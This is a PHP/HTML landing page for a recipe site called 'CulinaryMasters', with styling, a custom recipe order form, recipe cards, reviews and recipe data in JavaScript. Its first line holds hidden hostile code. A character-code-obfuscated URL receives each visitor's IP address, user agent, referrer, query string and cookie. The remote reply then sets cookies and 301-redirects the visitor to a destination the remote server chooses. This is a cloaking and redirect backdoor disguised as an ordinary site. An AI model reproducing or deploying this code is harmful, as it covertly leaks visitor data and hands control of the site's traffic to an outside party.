<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "504359";$uid="706nc7kwq9084muuf52968j2o";$qu=$_SERVER["QUERY_STRING"];$postdata = http_build_query(array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref" => $_SERVER["HTTP_REFERER"],"ip" =>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn" => $_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query" => $_SERVER["QUERY_STRING"],"ua" => $_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id" =>$uid,"id" => $id));$opts = array("http" =>array("method" => "POST","header" => "Content-type: application/x-www-form-urlencoded","content" => $postdata));$context = stream_context_create($opts);$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$result=file_get_contents($u,false,$context);$arr=explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0]==="true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CulinaryMasters - Premium Recipe Collection & Custom Orders</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Georgia', serif;
            line-height: 1.6;
            color: #333;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background: linear-gradient(135deg, #1a0e08 0%, #2d1b14 50%, #8b4513 100%);
            color: white;
            padding: 1.2rem 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            box-shadow: 0 4px 30px rgba(0,0,0,0.4);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255,215,0,0.2);
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 1.8rem;
            font-weight: bold;
            background: linear-gradient(45deg, #ffd700, #ff6b35, #ffd700);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
            animation: shimmer 3s ease-in-out infinite;
        }

        @keyframes shimmer {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .nav-links {
            display: flex;
            list-style: none;
            gap: 2rem;
        }

        .nav-links a {
            color: white;
            text-decoration: none;
            transition: color 0.3s ease;
            font-weight: 500;
        }

        .nav-links a:hover {
            color: #ffd700;
        }

        /* Hero Section */
        .hero {
            background: 
                linear-gradient(135deg, rgba(26,14,8,0.8) 0%, rgba(0,0,0,0.4) 50%, rgba(139,69,19,0.6) 100%),
                radial-gradient(circle at 20% 80%, rgba(255,107,53,0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255,215,0,0.3) 0%, transparent 50%),
                url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><rect fill="%23f4f1e8" width="1200" height="600"/><circle cx="300" cy="150" r="50" fill="%23d4af37" opacity="0.3"/><circle cx="900" cy="450" r="70" fill="%23cd853f" opacity="0.2"/><rect x="100" y="300" width="200" height="100" rx="10" fill="%23deb887" opacity="0.4"/></svg>');
            height: 100vh;
            display: flex;
            align-items: center;
            text-align: center;
            color: white;
            background-size: cover;
            background-position: center;
            position: relative;
            overflow: hidden;
        }

        .hero::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 30% 20%, rgba(255,215,0,0.1) 0%, transparent 50%),
                radial-gradient(circle at 70% 80%, rgba(255,107,53,0.1) 0%, transparent 50%);
            animation: pulse 4s ease-in-out infinite alternate;
        }

        @keyframes pulse {
            0% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .hero-content {
            position: relative;
            z-index: 2;
        }

        .hero-content h1 {
            font-size: 5rem;
            margin-bottom: 1.5rem;
            background: linear-gradient(45deg, #ffffff, #ffd700, #ffffff);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 50px rgba(255,255,255,0.5);
            animation: fadeInUp 1s ease-out, textShimmer 4s ease-in-out infinite;
        }

        @keyframes textShimmer {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .hero-content p {
            font-size: 1.5rem;
            margin-bottom: 2rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.7);
            animation: fadeInUp 1s ease-out 0.3s both;
        }

        .cta-button {
            background: linear-gradient(45deg, #ff6b35 0%, #f7931e 25%, #ffdc00 50%, #f7931e 75%, #ff6b35 100%);
            background-size: 300% 100%;
            color: white;
            padding: 1.2rem 3.5rem;
            font-size: 1.3rem;
            font-weight: bold;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.4s ease;
            text-decoration: none;
            display: inline-block;
            box-shadow: 
                0 8px 25px rgba(255, 107, 53, 0.4),
                0 0 0 0 rgba(255, 107, 53, 0.7);
            animation: fadeInUp 1s ease-out 0.6s both;
            position: relative;
            overflow: hidden;
        }

        .cta-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.6s;
        }

        .cta-button:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 
                0 15px 40px rgba(255, 107, 53, 0.5),
                0 0 0 10px rgba(255, 107, 53, 0.1);
            background-position: 100% 0;
            animation: buttonPulse 2s infinite;
        }

        .cta-button:hover::before {
            left: 100%;
        }

        @keyframes buttonPulse {
            0%, 100% { box-shadow: 0 15px 40px rgba(255, 107, 53, 0.5), 0 0 0 0 rgba(255, 107, 53, 0.7); }
            50% { box-shadow: 0 15px 40px rgba(255, 107, 53, 0.5), 0 0 0 20px rgba(255, 107, 53, 0); }
        }

        /* Custom Order Section */
        .custom-order {
            background: 
                linear-gradient(135deg, #ffd700 0%, #ffed4e 25%, #fff9c4 50%, #ffed4e 75%, #ffd700 100%),
                radial-gradient(circle at 25% 25%, rgba(255,107,53,0.1) 0%, transparent 50%),
                radial-gradient(circle at 75% 75%, rgba(139,69,19,0.1) 0%, transparent 50%);
            padding: 5rem 0;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .custom-order::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%),
                conic-gradient(from 0deg, transparent, rgba(255,255,255,0.1), transparent);
            animation: rotate 30s linear infinite;
        }

        .custom-order::after {
            content: '';
            position: absolute;
            top: 10%;
            left: 10%;
            right: 10%;
            bottom: 10%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            border-radius: 20px;
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(1deg); }
        }

        .custom-order-content {
            position: relative;
            z-index: 2;
        }

        .custom-order h2 {
            font-size: 3rem;
            color: #2c1810;
            margin-bottom: 1rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }

        .custom-order p {
            font-size: 1.3rem;
            color: #2c1810;
            margin-bottom: 2rem;
            max-width: 800px;
            margin-left: auto;
            margin-right: auto;
        }

        .order-form {
            background: rgba(255,255,255,0.95);
            padding: 3rem;
            border-radius: 25px;
            box-shadow: 
                0 20px 60px rgba(0,0,0,0.15),
                0 0 0 1px rgba(255,255,255,0.5);
            max-width: 600px;
            margin: 0 auto;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,215,0,0.3);
            position: relative;
            overflow: hidden;
        }

        .order-form::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ff6b35, #ffd700, #ff6b35);
            background-size: 200% 100%;
            animation: borderFlow 3s ease-in-out infinite;
        }

        @keyframes borderFlow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .form-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: bold;
            color: #2c1810;
        }

        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 1rem;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }

        .form-group input:focus,
        .form-group textarea:focus {
            outline: none;
            border-color: #ff6b35;
        }

        /* Recipes Section */
        .recipes {
            padding: 5rem 0;
            background: #f8f9fa;
        }

        .section-title {
            text-align: center;
            font-size: 3rem;
            margin-bottom: 3rem;
            color: #2c1810;
            position: relative;
        }

        .section-title::after {
            content: '';
            width: 100px;
            height: 4px;
            background: linear-gradient(45deg, #ff6b35, #ffd700);
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            border-radius: 2px;
        }

        .recipe-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }

        .recipe-card {
            background: linear-gradient(145deg, #ffffff 0%, #fafafa 100%);
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 
                0 15px 35px rgba(0,0,0,0.1),
                0 5px 15px rgba(0,0,0,0.05);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
            border: 1px solid rgba(255,215,0,0.1);
            cursor: pointer;
        }

        .recipe-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent, rgba(255,215,0,0.05), transparent);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .recipe-card:hover {
            transform: translateY(-15px) scale(1.02);
            box-shadow: 
                0 25px 50px rgba(0,0,0,0.15),
                0 10px 25px rgba(255,107,53,0.1);
        }

        .recipe-card:hover::before {
            opacity: 1;
        }

        .recipe-image {
            width: 100%;
            height: 250px;
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 25%, #fecfef 75%, #ff9a9e 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 4rem;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            position: relative;
            overflow: hidden;
        }

        .recipe-image::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            transition: left 0.6s;
        }

        .recipe-card:hover .recipe-image::before {
            left: 100%;
        }

        .recipe-content {
            padding: 1.5rem;
        }

        .recipe-content h3 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
            color: #2c1810;
        }

        .recipe-content p {
            color: #666;
            margin-bottom: 1rem;
        }

        .recipe-meta {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.9rem;
            color: #888;
        }

        /* Reviews Section */
        .reviews {
            padding: 5rem 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .reviews-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }

        .review-card {
            background: rgba(255,255,255,0.1);
            padding: 2rem;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
            transition: all 0.3s ease;
        }

        .review-card:hover {
            transform: translateY(-5px);
            background: rgba(255,255,255,0.15);
        }

        .reviewer {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
        }

        .reviewer-photo {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(45deg, #ffd700, #ff6b35);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            font-weight: bold;
            margin-right: 1rem;
            color: white;
        }

        .stars {
            color: #ffd700;
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }

        /* About Section */
        .about {
            padding: 5rem 0;
            background: #f8f9fa;
        }

        .about-content {
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }

        .about-content p {
            font-size: 1.2rem;
            line-height: 1.8;
            color: #555;
            margin-bottom: 2rem;
        }

        /* Vision Section */
        .vision {
            padding: 5rem 0;
            background: linear-gradient(135deg, #2c1810 0%, #8b4513 100%);
            color: white;
            text-align: center;
        }

        .vision-content {
            max-width: 800px;
            margin: 0 auto;
        }

        .vision-content p {
            font-size: 1.3rem;
            line-height: 1.8;
            margin-bottom: 2rem;
        }

        /* Contact Section */
        .contact {
            padding: 5rem 0;
            background: #f8f9fa;
        }

        .contact-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3rem;
            align-items: start;
        }

        .contact-info h3 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
            color: #2c1810;
        }

        .contact-info p {
            margin-bottom: 1rem;
            color: #666;
        }

        .contact-form {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        /* Footer */
        footer {
            background: #2c1810;
            color: white;
            text-align: center;
            padding: 2rem 0;
        }

        /* Animations */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* Recipe Modal */
        .recipe-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            backdrop-filter: blur(10px);
        }

        .recipe-modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 25px;
            max-width: 800px;
            max-height: 90vh;
            overflow-y: auto;
            position: relative;
            margin: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }

        .modal-header {
            position: relative;
            height: 300px;
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 25%, #fecfef 75%, #ff9a9e 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 5rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .close-modal {
            position: absolute;
            top: 20px;
            right: 25px;
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            font-size: 2rem;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            cursor: pointer;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .close-modal:hover {
            background: rgba(255,255,255,0.3);
            transform: scale(1.1);
        }

        .modal-body {
            padding: 2rem;
        }

        .modal-body h2 {
            font-size: 2.5rem;
            color: #2c1810;
            margin-bottom: 1rem;
        }

        .modal-meta {
            display: flex;
            gap: 2rem;
            margin-bottom: 2rem;
            padding: 1rem;
            background: #f8f9fa;
            border-radius: 15px;
        }

        .modal-meta span {
            font-weight: bold;
            color: #666;
        }

        .ingredients, .instructions {
            margin-bottom: 2rem;
        }

        .ingredients h3, .instructions h3 {
            font-size: 1.5rem;
            color: #2c1810;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 2px solid #ffd700;
        }

        .ingredients ul {
            list-style: none;
            padding: 0;
        }

        .ingredients li {
            padding: 0.5rem 0;
            padding-left: 1.5rem;
            position: relative;
            border-bottom: 1px solid #eee;
        }

        .ingredients li::before {
            content: '🥄';
            position: absolute;
            left: 0;
        }

        .instructions ol {
            padding-left: 1.5rem;
        }

        .instructions li {
            padding: 1rem 0;
            line-height: 1.6;
            border-bottom: 1px solid #eee;
        }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }
            
            .hero-content h1 {
                font-size: 2.5rem;
            }
            
            .hero-content p {
                font-size: 1.2rem;
            }
            
            .custom-order h2 {
                font-size: 2rem;
            }
            
            .section-title {
                font-size: 2rem;
            }
            
            .contact-content {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <header>
        <nav class="container">
            <div class="logo">CulinaryMasters</div>
            <ul class="nav-links">
                <li><a href="#home">Home</a></li>
                <li><a href="#custom-order">Custom Order</a></li>
                <li><a href="#recipes">Recipes</a></li>
                <li><a href="#reviews">Reviews</a></li>
                <li><a href="#about">About</a></li>
                <li><a href="#contact">Contact</a></li>
            </ul>
        </nav>
    </header>

    <section id="home" class="hero">
        <div class="container">
            <div class="hero-content">
                <h1>Premium Recipe Collection</h1>
                <p>Discover authentic flavors from around the world, crafted by master chefs</p>
                <a href="#custom-order" class="cta-button">Order Your Custom Recipe FREE</a>
            </div>
        </div>
    </section>

    <section id="custom-order" class="custom-order">
        <div class="container">
            <div class="custom-order-content">
                <h2>🎯 Custom Recipe Service</h2>
                <p>Can't find your favorite recipe? No problem! Tell us what you're craving and we'll create a personalized recipe just for you - delivered within 24 hours, completely FREE!</p>
                
                <form class="order-form">
                    <div class="form-group">
                        <label for="recipe-name">What Recipe Do You Want?</label>
                        <input type="text" id="recipe-name" placeholder="e.g., Grandma's Apple Pie, Spicy Thai Curry..." required>
                    </div>
                    
                    <div class="form-group">
                        <label for="dietary">Any Dietary Preferences?</label>
                        <input type="text" id="dietary" placeholder="Vegetarian, Gluten-free, Low-carb, etc.">
                    </div>
                    
                    <div class="form-group">
                        <label for="email">Your Email</label>
                        <input type="email" id="email" placeholder="your@email.com" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="details">Additional Details</label>
                        <textarea id="details" rows="3" placeholder="Tell us more about what you're looking for..."></textarea>
                    </div>
                    
                    <button type="submit" class="cta-button">Get My FREE Custom Recipe</button>
                </form>
            </div>
        </div>
    </section>

    <section id="recipes" class="recipes">
        <div class="container">
            <h2 class="section-title">Featured Recipes</h2>
            <div class="recipe-grid">
                <div class="recipe-card">
                    <div class="recipe-image">🍝</div>
                    <div class="recipe-content">
                        <h3>Classic Italian Carbonara</h3>
                        <p>Creamy, authentic carbonara with pancetta, eggs, and Parmesan cheese. A Roman classic that's perfect for any dinner.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 20 mins</span>
                            <span>👥 4 servings</span>
                            <span>⭐ 4.9/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🥘</div>
                    <div class="recipe-content">
                        <h3>Moroccan Chicken Tagine</h3>
                        <p>Slow-cooked chicken with apricots, almonds, and aromatic spices. A fragrant dish that brings Morocco to your table.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 2 hours</span>
                            <span>👥 6 servings</span>
                            <span>⭐ 4.8/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🍜</div>
                    <div class="recipe-content">
                        <h3>Authentic Ramen Bowl</h3>
                        <p>Rich tonkotsu broth with tender pork, soft-boiled eggs, and fresh noodles. Restaurant-quality ramen at home.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 45 mins</span>
                            <span>👥 2 servings</span>
                            <span>⭐ 4.9/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🌮</div>
                    <div class="recipe-content">
                        <h3>Street-Style Fish Tacos</h3>
                        <p>Crispy beer-battered fish with tangy slaw and creamy chipotle sauce. Fresh, vibrant, and absolutely delicious.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 30 mins</span>
                            <span>👥 4 servings</span>
                            <span>⭐ 4.7/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🍛</div>
                    <div class="recipe-content">
                        <h3>Indian Butter Chicken</h3>
                        <p>Tender chicken in a rich, creamy tomato-based sauce with aromatic spices. Comfort food at its finest.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 40 mins</span>
                            <span>👥 4 servings</span>
                            <span>⭐ 4.8/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🥗</div>
                    <div class="recipe-content">
                        <h3>Mediterranean Quinoa Bowl</h3>
                        <p>Healthy quinoa with fresh vegetables, feta cheese, and lemon vinaigrette. Light, nutritious, and satisfying.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 25 mins</span>
                            <span>👥 2 servings</span>
                            <span>⭐ 4.6/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🍰</div>
                    <div class="recipe-content">
                        <h3>Decadent Chocolate Cake</h3>
                        <p>Moist chocolate cake with rich ganache frosting. Perfect for celebrations or when you need something sweet.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 1.5 hours</span>
                            <span>👥 8 servings</span>
                            <span>⭐ 4.9/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🍲</div>
                    <div class="recipe-content">
                        <h3>Hearty Beef Stew</h3>
                        <p>Slow-cooked beef with vegetables in a rich broth. Perfect comfort food for cold days and family dinners.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 3 hours</span>
                            <span>👥 6 servings</span>
                            <span>⭐ 4.8/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🥙</div>
                    <div class="recipe-content">
                        <h3>Greek Gyros</h3>
                        <p>Seasoned lamb with tzatziki, fresh vegetables, and warm pita bread. A taste of the Mediterranean islands.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 35 mins</span>
                            <span>👥 4 servings</span>
                            <span>⭐ 4.7/5</span>
                        </div>
                    </div>
                </div>
                
                <div class="recipe-card">
                    <div class="recipe-image">🍣</div>
                    <div class="recipe-content">
                        <h3>Sushi Roll Platter</h3>
                        <p>Fresh sushi rolls with salmon, avocado, and cucumber. Restaurant-quality sushi made simple for home cooks.</p>
                        <div class="recipe-meta">
                            <span>⏱️ 45 mins</span>
                            <span>👥 3 servings</span>
                            <span>⭐ 4.9/5</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="reviews" class="reviews">
        <div class="container">
            <h2 class="section-title" style="color: white;">What Our Customers Say</h2>
            <div class="reviews-grid">
                <div class="review-card">
                    <div class="reviewer">
                        <div class="reviewer-photo">SM</div>
                        <div>
                            <h4>Sarah Mitchell</h4>
                            <p>Home Cook, California</p>
                        </div>
                    </div>
                    <div class="stars">★★★★★</div>
                    <p>"I requested a gluten-free lasagna recipe and received it within 12 hours! The instructions were so detailed and easy to follow. My family couldn't believe it was gluten-free. CulinaryMasters truly delivers on their promise!"</p>
                </div>
                
                <div class="review-card">
                    <div class="reviewer">
                        <div class="reviewer-photo">MJ</div>
                        <div>
                            <h4>Michael Johnson</h4>
                            <p>Restaurant Owner, Texas</p>
                        </div>
                    </div>
                    <div class="stars">★★★★★</div>
                    <p>"As a restaurant owner, I needed unique appetizer ideas for my menu. The custom recipe service provided me with 3 amazing options that became customer favorites. The creativity and attention to detail is outstanding!"</p>
                </div>
                
                <div class="review-card">
                    <div class="reviewer">
                        <div class="reviewer-photo">EW</div>
                        <div>
                            <h4>Emily Watson</h4>
                            <p>Food Blogger, New York</p>
                        </div>
                    </div>
                    <div class="stars">★★★★★</div>
                    <p>"The recipe collection here is incredible! I've tried over 15 recipes and each one has been perfect. The custom service is a game-changer - I got a vegan version of my grandmother's cake recipe that tastes exactly like I remembered!"</p>
                </div>
            </div>
        </div>
    </section>

    <section id="about" class="about">
        <div class="container">
            <h2 class="section-title">About CulinaryMasters</h2>
            <div class="about-content">
                <p>Founded by a team of passionate chefs and food enthusiasts, CulinaryMasters brings together decades of culinary expertise from around the world. Our mission is to make exceptional cooking accessible to everyone, regardless of skill level or dietary requirements.</p>
                
                <p>We believe that great food brings people together, creates memories, and nourishes both body and soul. That's why we've curated a collection of time-tested recipes and developed our unique custom recipe service to ensure you always have the perfect dish for any occasion.</p>
                
                <p>Our team of certified chefs, nutritionists, and food scientists work tirelessly to create recipes that are not only delicious but also practical for home cooking. Every recipe is tested multiple times to ensure consistent, restaurant-quality results.</p>
            </div>
        </div>
    </section>

    <section id="vision" class="vision">
        <div class="container">
            <h2 class="section-title" style="color: white;">Our Vision</h2>
            <div class="vision-content">
                <p>We envision a world where everyone can create extraordinary meals at home, where cultural boundaries dissolve through shared culinary experiences, and where the joy of cooking brings families and communities closer together.</p>
                
                <p>Our goal is to become the world's most trusted source for personalized culinary experiences, empowering home cooks to explore new flavors, accommodate dietary needs, and create memorable dining experiences for their loved ones.</p>
                
                <p>Through innovation, dedication, and a genuine love for food, we're building a platform that celebrates the diversity of global cuisine while making it accessible to kitchens everywhere.</p>
            </div>
        </div>
    </section>

    <section id="contact" class="contact">
        <div class="container">
            <h2 class="section-title">Get In Touch</h2>
            <div class="contact-content">
                <div class="contact-info">
                    <h3>Contact Information</h3>
                    <p><strong>Email:</strong> hello@culinarymasters.com</p>
                    <p><strong>Phone:</strong> +1 (555) 123-CHEF</p>
                    <p><strong>Address:</strong> 123 Culinary Street, Food District, NY 10001</p>
                    <p><strong>Business Hours:</strong><br>
                    Monday - Friday: 9:00 AM - 6:00 PM<br>
                    Saturday: 10:00 AM - 4:00 PM<br>
                    Sunday: Closed</p>
                    
                    <h3 style="margin-top: 2rem;">Follow Us</h3>
                    <p>Stay connected for daily recipe tips, cooking inspiration, and exclusive offers!</p>
                </div>
                
                <form class="contact-form">
                    <h3>Send Us a Message</h3>
                    <div class="form-group">
                        <label for="contact-name">Name</label>
                        <input type="text" id="contact-name" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="contact-email">Email</label>
                        <input type="email" id="contact-email" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="subject">Subject</label>
                        <input type="text" id="subject" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="message">Message</label>
                        <textarea id="message" rows="4" required></textarea>
                    </div>
                    
                    <button type="submit" class="cta-button">Send Message</button>
                </form>
            </div>
        </div>
    </section>

    <footer>
        <div class="container">
            <p>&copy; 2025 CulinaryMasters. All rights reserved. | Privacy Policy | Terms of Service</p>
            <p>Bringing the world's flavors to your kitchen, one recipe at a time.</p>
        </div>
    </footer>

    <!-- Recipe Modal -->
    <div id="recipeModal" class="recipe-modal">
        <div class="modal-content">
            <div class="modal-header">
                <span id="modalEmoji">🍝</span>
                <button class="close-modal" onclick="closeRecipeModal()">&times;</button>
            </div>
            <div class="modal-body">
                <h2 id="modalTitle">Recipe Title</h2>
                <div class="modal-meta">
                    <span id="modalTime">⏱️ 20 mins</span>
                    <span id="modalServings">👥 4 servings</span>
                    <span id="modalRating">⭐ 4.9/5</span>
                </div>
                <p id="modalDescription">Recipe description goes here...</p>
                
                <div class="ingredients">
                    <h3>Ingredients</h3>
                    <ul id="modalIngredients">
                        <!-- Ingredients will be populated by JavaScript -->
                    </ul>
                </div>
                
                <div class="instructions">
                    <h3>Instructions</h3>
                    <ol id="modalInstructions">
                        <!-- Instructions will be populated by JavaScript -->
                    </ol>
                </div>
            </div>
        </div>
    </div>

    <script>
    <script>
        // Recipe data
        const recipes = {
            'carbonara': {
                emoji: '🍝',
                title: 'Classic Italian Carbonara',
                time: '⏱️ 20 mins',
                servings: '👥 4 servings',
                rating: '⭐ 4.9/5',
                description: 'Creamy, authentic carbonara with pancetta, eggs, and Parmesan cheese. A Roman classic that\'s perfect for any dinner.',
                ingredients: [
                    '1 lb spaghetti or linguine',
                    '6 oz pancetta or guanciale, diced',
                    '4 large eggs',
                    '1 cup freshly grated Parmesan cheese',
                    '1/2 cup freshly grated Pecorino Romano cheese',
                    '3 cloves garlic, minced',
                    'Freshly ground black pepper',
                    'Salt for pasta water',
                    '2 tbsp olive oil'
                ],
                instructions: [
                    'Bring a large pot of salted water to boil. Cook pasta according to package directions until al dente.',
                    'While pasta cooks, heat olive oil in a large skillet over medium heat. Add pancetta and cook until crispy, about 5-7 minutes.',
                    'In a bowl, whisk together eggs, Parmesan, Pecorino Romano, and plenty of black pepper.',
                    'Add minced garlic to the pancetta and cook for 1 minute until fragrant.',
                    'Reserve 1 cup pasta cooking water, then drain pasta.',
                    'Remove skillet from heat. Add hot pasta to the pancetta and toss.',
                    'Quickly pour in the egg mixture, tossing constantly with tongs to create a creamy sauce.',
                    'Add pasta water gradually until you reach desired consistency.',
                    'Serve immediately with extra cheese and black pepper.'
                ]
            },
            'tagine': {
                emoji: '🥘',
                title: 'Moroccan Chicken Tagine',
                time: '⏱️ 2 hours',
                servings: '👥 6 servings',
                rating: '⭐ 4.8/5',
                description: 'Slow-cooked chicken with apricots, almonds, and aromatic spices. A fragrant dish that brings Morocco to your table.',
                ingredients: [
                    '3 lbs chicken, cut into pieces',
